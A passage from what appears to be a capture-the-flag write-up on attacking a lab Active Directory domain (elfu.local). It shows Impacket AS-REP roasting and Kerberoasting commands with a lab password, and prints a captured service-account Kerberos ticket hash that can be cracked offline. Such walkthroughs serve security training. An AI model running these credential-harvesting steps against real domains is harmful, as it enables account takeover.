# Let's Roast!

The first thing I tried to do was check to see if anyone was ASREPRoastable, or anyone's account that does not require Kerberos pre-authentication. This is a long shot, but hey, you never know.

Using the following command:

    GetNPUsers.py -usersfile ./userlist.txt -dc-ip <IP> elfu.local/

and replacing `<IP>` with either `10.128.1.53` or `10.128.3.30` gave lots of:

```text
<<snip>>

[-] User raulpenrod doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User charleneneptune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User xavierzebra doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User victoriacharles doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paulyankee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ulyssestrebek doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lukeyankee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paulhankerson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User quincyjones doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User maryhankerson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ulyssespenrod doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User charlenesmith doesn't have UF_DONT_REQUIRE_PREAUTH set

<<snip>>
```

Nothing. Oh well. I didn't expect anything but you have to be thorough if you have the capability.

But what about any Kerberoastable users?

```sh
fkhcuqviyc@grades:~$ GetUserSPNs.py -dc-ip 10.128.1.53 elfu.local/fkhcuqviyc:'Biqhxtixe#' -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon                   Delegation 
-----------------------------------  --------  --------  --------------------------  --------------------------  ----------
ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  2021-12-16 14:40:43.512518             
ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  2021-12-16 14:40:43.512518             
ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  2021-12-16 14:40:43.512518             
ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  2021-12-16 14:40:43.512518             



$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$15d456e6a0ddfc31de19dd90eb7ea888$420ae57a4a86e890710036fa59a4791e85ea0fbf750ff29ffb9540c565b04203bb1774bd07d749e20439d1966bbcd03302f5593c0bb6b71344358c7723ac795495a1d3b955b66b17a5bca627621b74b0dfccded3db700f84ac3175a4047c19031bdf11aaaa70660351372b74f12003d701d7ff1d79d8ee2698b5578334872ca09777dc2fefae60585af4c3af22321637556eb3d74b46c68acf51200b17935debfbbd24d1522f9cf0cbac69bff3c1c0d1c4442fc4a1129ecb6281849d817a46929c88b0b56a9bd46f544c4615a4e673d9336dfc9dcf55f9b9073a52aa000816c4273893282e4dbf63b1b95e34c05bc52494f9354d2f0dfbbc866bfb928e979556167943f7088afb9b8cb1f0d41423e253aca2991f08c0225ac0dd8dcf2e3cb6dcdf70fe2673adfe3db3b13fc3cc1cb86a03fc9cd04f043444a086f55899c20403cf89a529a5e9a47da3b8ae3f34d4a7a44a77b6d70ac0b8dd90f15c7ba94d46b76f5bae9314177918e511e84c41320595221453d36b9c96f617f9a1ba5e2f00ba4418935d7b83a49b2f1c8960c8554c7309f0c58dc0e8aab1e77900476ef3b1c9b46a44c19d5e7041fbc1e8a459cd682758abfe1e380d3af0a3454db5d20cc0c8e94c62e49fa42bdec999b043192b22c5921e1dd2ba5e606dd76c10e1f898fb183748cd75dd80aa0c7299ee83b5b1df32eee511c1caee0837a30bf55a311429427ac3fc25c416dce927c3aa1d4c14ba4da00624d042edd837d44c1afbaf51f33939c0ceb3363c64de734ef4f7297672ec914de85b08819b3bede9a53df3c1f8e5897271195ec35545b5d92007a4ed445bc15e621dc8c078122dea9cc7c56ed7bcde5baea57a045e1c4ab98331e357cd238e4e49d87791c5f0cbc907dc6955dafc799dcb0f8c161d14a2a59c7c6d8c403fa2ee595b36b9080d4c20fcd7150a37ed48222a7927d043a18fe1cf7cbe4fb6924abcee5b4a76ab2743a0648c40edcceaedb24abac4a8204932698b4289d241b35cf7e6b4cee2567eed74828eac36fcb0148c19586d3419656ee19be7be4ff54626a5bd6d63da1476c86bb367a2b5d6803b4374a99dc9b85226e1bf0937577ac0955a44d0c3141fd7884d9723acf940274b2f748ec0f7f85552876e819c5e4338a11c54a21d9e039e819600d6118a8a38e6bff38b23871adfb602333857b48fde9da783ba9cdc51845e129073ef81d5a6ed3ddf2f07170495fa1b3187082917a2ffa51636f22d162bd42847e8c320e2920f800cdcc692a79177c36ecb6d502dd92b7cac5e83a543e21fa4273d79dc52ba19c05c693a940b7003f5ac36ed4145dd01ba19f19abc76a537bfbd37fa9c5d3269ab3478d0f0f9afc57acccb7a0eab28b17da38359d02f1ef13a9a2909adf2da9184dc1a6b9959133fe688d8b1b8774ddbf30f29880e0474a1e3df4fa82cb624c19bb1b844
```


In the immortal words of Janine from The Ghostbusters...

# WE GOT ONE!